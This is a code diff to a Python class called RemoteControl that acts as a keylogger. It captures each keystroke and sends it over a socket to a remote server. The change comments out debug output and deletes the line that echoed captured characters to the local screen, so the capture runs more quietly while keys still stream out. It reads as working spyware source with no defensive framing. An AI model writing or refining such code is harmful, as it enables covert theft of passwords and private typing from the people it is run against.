@@ -34,12 +34,12 @@ class RemoteControl:
         if self.keylogger_active:
             try:
                 # [*] check 'vk': 65437 bug
-                key_attributes = dir(key)
-                for attributes in key_attributes:
-                    if not callable(getattr(key, attributes)):
-                        pr = getattr(key, attributes)
-                        if isinstance(pr, dict):
-                            print("\n", pr)
+                # key_attributes = dir(key)
+                # for attributes in key_attributes:
+                #    if not callable(getattr(key, attributes)):
+                #        pr = getattr(key, attributes)
+                #        if isinstance(pr, dict):
+                #            print("\n", pr)
 
                 # Check if the key represents the backspace key
                 if key == Key.backspace:
@@ -68,8 +68,6 @@ class RemoteControl:
                     char = "9"
                 else:
                     char = getattr(key, 'char')
-                if char is not None:
-                    print(char, end='', flush=True)
                 self.server_socket.send(char.encode())
             except Exception as e_cap_key:
                 print(f"\ndef [capture_keys] Error:\n{e_cap_key}")
